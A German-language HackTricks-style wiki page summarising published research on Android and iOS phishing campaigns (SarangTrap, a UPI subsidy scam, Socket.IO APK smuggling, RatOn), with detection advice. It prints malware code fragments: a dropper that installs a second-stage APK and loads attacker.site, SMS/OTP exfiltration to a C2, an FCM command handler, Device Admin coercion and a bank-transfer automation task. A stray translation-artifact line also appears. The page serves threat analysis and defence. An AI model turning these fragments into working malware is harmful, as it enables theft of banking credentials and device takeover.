# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, die von threat actors verwendet werden, um **malicious Android APKs** und **iOS mobile-configuration profiles** über phishing (SEO, social engineering, fake stores, dating apps usw.) zu verbreiten.
> Das Material wurde aus der SarangTrap-Kampagne, die von Zimperium zLabs (2025) veröffentlicht wurde, und anderen öffentlichen Forschungen adaptiert.

## Angriffsablauf

1. **SEO/Phishing-Infrastruktur**
* Registriere Dutzende look-alike Domains (dating, cloud share, car service …).
– Verwende lokale Sprach-Keywords und Emojis im `<title>`-Element, um bei Google zu ranken.
– Hoste *both* Android (`.apk`) und iOS Installationsanweisungen auf derselben Landing-Page.
2. **Erster Download**
* Android: direkter Link zu einer *unsigned* oder „third-party store“ APK.
* iOS: `itms-services://` oder ein normaler HTTPS-Link zu einem bösartigen **mobileconfig** profile (siehe unten).
3. **Post-Install Social Engineering**
* Beim ersten Start fragt die App nach einem **Einladungs-/Verifizierungscode** (Illusion exklusiven Zugangs).
* Der Code wird **POSTed over HTTP** an das Command-and-Control (C2).
* C2 antwortet `{"success":true}` ➜ malware continues.
* Sandbox / AV dynamic analysis, die niemals einen gültigen Code übermittelt, sieht **kein malicious behaviour** (Evasion).
4. **Missbrauch von Laufzeitberechtigungen (Android)**
* Gefährliche Berechtigungen werden erst **nach positive C2-Antwort** angefragt:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Neuere Varianten **entfernen `<uses-permission>` für SMS aus der `AndroidManifest.xml`**, lassen aber den Java/Kotlin-Codepfad bestehen, der SMS per Reflection liest ⇒ senkt den statischen Score, bleibt aber auf Geräten funktional, die die Berechtigung via `AppOps`-Missbrauch oder alte Targets gewähren.
5. **Fassade-UI & Hintergrund-Erfassung**
* Die App zeigt harmlose Views (SMS viewer, gallery picker), lokal implementiert.
* Gleichzeitig exfiltriert sie:
- IMEI / IMSI, Telefonnummer
- Vollständiges `ContactsContract`-Dump (JSON-Array)
- JPEG/PNG aus `/sdcard/DCIM`, komprimiert mit [Luban](https://github.com/Curzibn/Luban) zur Größenreduktion
- Optionale SMS-Inhalte (`content://sms`)
Payloads werden **batch-zipped** und via `HTTP POST /upload.php` gesendet.
6. **iOS Delivery Technique**
* Ein einzelnes **mobile-configuration profile** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. anfordern, um das Gerät in eine “MDM”-ähnliche Supervision einzuschreiben.
* Social-engineering-Anweisungen:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (Screenshots auf der Phishing-Seite).
3. Trust the unsigned profile ➜ Angreifer erhält *Contacts* & *Photo* entitlement ohne App Store Review.
7. **Netzwerkebene**
* Plain HTTP, oft auf Port 80 mit HOST-Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Defensive Testing / Red-Team Tipps

* **Dynamic Analysis Bypass** – Während der Malware-Analyse die Invitation-Code-Phase mit Frida/Objection automatisieren, um den malicious branch zu erreichen.
* **Manifest vs. Runtime Diff** – Vergleiche `aapt dump permissions` mit dem runtime `PackageManager#getRequestedPermissions()`; fehlende gefährliche Perms sind ein Red Flag.
* **Network Canary** – Konfiguriere `iptables -p tcp --dport 80 -j NFQUEUE`, um unsaubere POST-Bursts nach Code-Eingabe zu erkennen.
* **mobileconfig Inspection** – Nutze `security cms -D -i profile.mobileconfig` auf macOS, um `PayloadContent` aufzulisten und übermäßige Entitlements zu erkennen.

## Blue-Team Erkennungsansätze

* **Certificate Transparency / DNS Analytics**, um plötzliche Schübe keyword-reicher Domains zu fangen.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` von Dalvik-Clients außerhalb von Google Play.
* **Invite-code Telemetry** – POSTs von 6–8-stelligen numerischen Codes kurz nach APK-Install können auf Staging hinweisen.
* **MobileConfig Signing** – Blockiere unsigned configuration profiles via MDM-Policy.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indikatoren (Allgemein)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment-Phishing (UPI) – Dropper + FCM C2 Pattern

Dieses Pattern wurde in Kampagnen beobachtet, die Themen zu staatlichen Leistungen missbrauchen, um indische UPI-Zugangsdaten und OTPs zu stehlen. Operatoren koppeln vertrauenswürdige Plattformen für Verbreitung und Resilienz.

### Lieferkette über vertrauenswürdige Plattformen
- YouTube-Video-Lockvogel → Beschreibung enthält einen Kurzlink
- Kurzlink → GitHub Pages-Phishingseite, die das legitime Portal nachahmt
- Dasselbe GitHub-Repo hostet eine APK mit einem gefälschten “Google Play”-Badge, das direkt auf die Datei verlinkt
- Dynamische Phishing-Seiten laufen auf Replit; der Remote-Kommandokanal nutzt Firebase Cloud Messaging (FCM)

### Dropper mit eingebettetem Payload und Offline-Installation
- Die erste APK ist ein Installer (dropper), der die eigentliche Malware unter `assets/app.apk` enthält und den Benutzer auffordert, Wi‑Fi/Mobile-Daten zu deaktivieren, um Cloud-Detektion zu erschweren.
- Der eingebettete Payload installiert sich unter einer unverdächtigen Bezeichnung (z. B. „Secure Update“). Nach der Installation sind sowohl der Installer als auch der Payload als separate Apps vorhanden.

Statischer Triage-Tipp (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamische Endpunkt-Erkennung über shortlink
- Malware ruft von einem shortlink eine Klartext-, durch Kommas getrennte Liste aktiver Endpunkte ab; einfache String-Transformationen erzeugen den finalen Pfad zur Phishing-Seite.

Beispiel (bereinigt):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Der Schritt “Make payment of ₹1 / UPI‑Lite” lädt ein bösartiges HTML-Formular vom dynamischen Endpoint innerhalb eines WebView und erfasst sensible Felder (Telefon, Bank, UPI PIN), die per `POST` an `addup.php` gesendet werden.

Minimaler Loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Selbstverbreitung und Abfangen von SMS/OTP
- Beim ersten Start werden aggressive Berechtigungen angefordert:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte werden durchlaufen, um smishing-SMS massenhaft vom Gerät des Opfers zu versenden.
- Eingehende SMS werden von einem broadcast receiver abgefangen und zusammen mit Metadaten (Absender, Nachrichtentext, SIM slot, gerätebezogene Zufalls-ID) an `/addsm.php` hochgeladen.

Receiver-Skizze:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) als resilienter C2
- Der payload registriert sich bei FCM; Push-Nachrichten enthalten ein Feld `_type`, das als Schalter verwendet wird, um Aktionen auszulösen (z. B. phishing-Textvorlagen aktualisieren, Verhaltensweisen umschalten).

Beispiel FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler-Skizze:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting-Muster und IOCs
- APK enthält sekundäre Nutzlast bei `assets/app.apk`
- WebView lädt Zahlung von `gate.htm` und exfiltriert zu `/addup.php`
- SMS-Exfiltration zu `/addsm.php`
- Konfigurationsabruf über Shortlinks (z. B. `rebrand.ly/*`), der CSV-Endpunkte zurückgibt
- Apps mit der Bezeichnung "Update/Secure Update"
- FCM `data`-Nachrichten mit einem `_type`-Discriminator in nicht vertrauenswürdigen Apps

### Erkennungs- & Abwehrideen
- Kennzeichne Apps, die Benutzer anweisen, das Netzwerk während der Installation zu deaktivieren und anschließend eine zweite APK aus `assets/` zu sideloaden.
- Alarm bei der Berechtigungs-Kombination: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-basierte Zahlungsabläufe.
- Egress-Monitoring für `POST /addup.php|/addsm.php` auf nicht-Unternehmenshosts; bekannte Infrastruktur blockieren.
- Mobile EDR-Regeln: nicht vertrauenswürdige App, die sich für FCM registriert und anhand eines `_type`-Felds verzweigt.

---

## Socket.IO/WebSocket-basierte APK-Schmuggelung + gefälschte Google Play-Seiten

Angreifer ersetzen zunehmend statische APK-Links durch einen in Google Play-ähnlichen Ködern eingebetteten Socket.IO/WebSocket-Kanal. Dadurch wird die Payload-URL verschleiert, URL-/Extension-Filter umgangen und eine realistische Installations-UX beibehalten.

Typischer Client-Ablauf, der in freier Wildbahn beobachtet wurde:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Warum es einfachen Kontrollen entgeht:
- Kein statischer APK-URL wird offenbart; die Payload wird im Speicher aus WebSocket-Frames rekonstruiert.
- URL/MIME/Erweiterungsfilter, die direkte .apk-Antworten blockieren, können binäre Daten, die über WebSockets/Socket.IO getunnelt werden, übersehen.
- Crawler und URL-Sandboxes, die WebSockets nicht ausführen, holen die Payload nicht ab.

Hunting und Detection-Ideen:
- Web-/Netzwerk-Telemetrie: markiere WebSocket-Sessions, die große binäre Blöcke übertragen, gefolgt von der Erstellung eines Blob mit MIME application/vnd.android.package-archive und einem programmatischen `<a download>`-Klick. Suche nach Client-Strings wie socket.emit('startDownload') und Events mit den Namen chunk, downloadProgress, downloadComplete in Page-Skripten.
- Play-store-Spoof-Heuristiken: auf Nicht-Google-Domains, die Play-ähnliche Seiten ausliefern, suche nach Google Play UI-Strings wie http.html:"VfPpkd-jY41G-V67aGc", gemischten Sprachvorlagen und gefälschten “verification/progress”-Flows, die durch WS-Ereignisse gesteuert werden.
- Controls: blockiere APK-Auslieferung von Nicht-Google-Ursprüngen; setze MIME-/Erweiterungsrichtlinien durch, die WebSocket-Verkehr einschließen; erhalte die Browser safe-download Prompts.

Siehe auch WebSocket tradecraft und Tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Die RatOn banker/RAT-Kampagne (ThreatFabric) ist ein konkretes Beispiel dafür, wie moderne mobile Phishing-Operationen WebView-Dropper, Accessibility-gesteuerte UI-Automatisierung, Overlays/Ransom, Device Admin-Nötigung, Automated Transfer System (ATS), Übernahme von Crypto-Wallets und sogar NFC-Relay-Orchestrierung kombinieren. Dieser Abschnitt abstrahiert die wiederverwendbaren Techniken.

### Stage-1: WebView → native Install-Bridge (dropper)
Angreifer präsentieren eine WebView, die auf eine Angreifer-Seite zeigt, und injizieren eine JavaScript-Schnittstelle, die einen nativen Installer exponiert. Ein Tipp auf einen HTML-Button ruft nativen Code auf, der ein in den Assets des dropper gebündeltes second-stage APK installiert und es dann direkt startet.

Minimales Muster:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Bitte fügen Sie den HTML-/Markdown-Inhalt der Seite ein, den ich ins Deutsche übersetzen soll. Ich werde Tags, Links, Pfade und Code unverändert lassen.
```html
<button onclick="bridge.installApk()">Install</button>
```
Nach der Installation startet der dropper die payload über ein explizites package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting-Idee: unvertrauenswürdige Apps, die `addJavascriptInterface()` aufrufen und installer-ähnliche Methoden an WebView exponieren; APK, die eine eingebettete sekundäre Nutzlast unter `assets/` liefert und die Package Installer Session API aufruft.

### Consent-Funnel: Accessibility + Device Admin + nachfolgende Runtime-Aufforderungen
Stage-2 öffnet eine WebView, die eine „Access“-Seite hostet. Ihr Button ruft eine exportierte Methode auf, die das Opfer zu den Accessibility-Einstellungen navigiert und das Aktivieren des bösartigen Dienstes anfordert. Sobald dies gewährt ist, nutzt die Malware Accessibility, um automatisch durch nachfolgende Runtime-Berechtigungsdialoge (Kontakte, Overlay, Systemeinstellungen verwalten, usw.) zu klicken und fordert Device Admin an.

- Accessibility hilft programmatisch, spätere Aufforderungen zu akzeptieren, indem es im Node-Tree Buttons wie „Allow“/„OK“ findet und Klicks auslöst.
- Overlay-Berechtigungsprüfung/-anfrage:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay-Phishing/Erpressung via WebView
Operatoren können Befehle senden, um:
- ein Vollbild-Overlay von einer URL anzuzeigen, oder
- inline HTML zu übergeben, das in einem WebView-Overlay geladen wird.

Wahrscheinliche Verwendungen: Nötigung (PIN-Eingabe), Öffnen der wallet, um PINs abzufangen, Erpressungsnachrichten. Einen Befehl vorsehen, um sicherzustellen, dass die Overlay-Berechtigung erteilt ist, falls sie fehlt.

### Remote-Control-Modell – textuelles Pseudo-Bildschirm + screen-cast
- Low-bandwidth: periodisch den Accessibility-Node-Baum ausgeben, sichtbare Texte/Rollen/Grenzen serialisieren und als Pseudo-Bildschirm an C2 senden (Befehle wie `txt_screen` einmalig und `screen_live` kontinuierlich).
- High-fidelity: MediaProjection anfordern und bei Bedarf screen-casting/Recording starten (Befehle wie `display` / `record`).

### ATS playbook (bank app automation)
Gegeben eine JSON-Aufgabe: die Bank-App öffnen, die UI über Accessibility steuern mit einer Mischung aus Textabfragen und Koordinaten-Taps, und bei Aufforderung die Zahlungs-PIN des Opfers eingeben.

Beispielaufgabe:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Neue Zahlung"
- "Zadat platbu" → "Zahlung eingeben"
- "Nový příjemce" → "Neuer Empfänger"
- "Domácí číslo účtu" → "Inländische Kontonummer"
- "Další" → "Weiter"
- "Odeslat" → "Senden"
- "Ano, pokračovat" → "Ja, fortfahren"
- "Zaplatit" → "Bezahlen"
- "Hotovo" → "Fertig"

Operatoren können Transferlimits auch per Befehle wie `check_limit` und `limit` prüfen/erhöhen, die ähnlich durch das Limits-UI navigieren.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Ablauf: entsperren (gestohlener PIN oder angegebenes Passwort), zu Security/Recovery navigieren, seed phrase anzeigen/aufdecken, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) um die Navigation über Sprachen hinweg zu stabilisieren.

### Device Admin coercion
Device Admin APIs werden verwendet, um die Chancen zur PIN-Erfassung zu erhöhen und das Opfer zu frustrieren:

- Immediate lock:
```java
dpm.lockNow();
```
- Bestehende Zugangsdaten ablaufen lassen, um eine Änderung zu erzwingen (Accessibility erfasst neue PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Erzwinge eine Entsperrung ohne Biometrie, indem du die biometrischen Keyguard-Funktionen deaktivierst:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Hinweis: Viele DevicePolicyManager-Steuerelemente erfordern auf aktuellen Android-Versionen Device Owner/Profile Owner; einige OEM-Builds können nachlässig sein. Validieren Sie immer auf dem Ziel-OS/OEM.

### NFC-Relay-Orchestrierung (NFSkate)
Stage-3 kann ein externes NFC-relay-Modul installieren und starten (z. B. NFSkate) und ihm sogar eine HTML-Vorlage übergeben, um das Opfer während des Relays anzuleiten. Dies ermöglicht kontaktloses card-present cash-out neben Online-ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator-Befehlsatz (Beispiel)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Erkennungs- und Abwehrideen (RatOn-Stil)
- Suche nach WebViews mit `addJavascriptInterface()`, die Installer-/Berechtigungsmethoden exponieren; Seiten, die auf “/access” enden und Accessibility-Aufforderungen auslösen.
- Alarm bei Apps, die kurz nach Gewährung des Service-Zugriffs hochfrequente Accessibility-Gesten/Klicks erzeugen; Telemetrie, die Accessibility-Node-Dumps ähnelt und an C2 gesendet wird.
- Überwache Device Admin-Policy-Änderungen in nicht vertrauenswürdigen Apps: `lockNow`, Passwortablauf, Keyguard-Feature-Toggles.
- Alarm bei MediaProjection-Aufforderungen von nicht-korporativen Apps, gefolgt von periodischen Frame-Uploads.
- Erkenne Installation/Start einer externen NFC-relay-App, die von einer anderen App ausgelöst wurde.
- Für Banking: Erzwinge Out-of-band-Bestätigungen, Biometrie-Bindung und Transaktionslimits, die gegen On-Device-Automation resistent sind.

## Referenzen

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
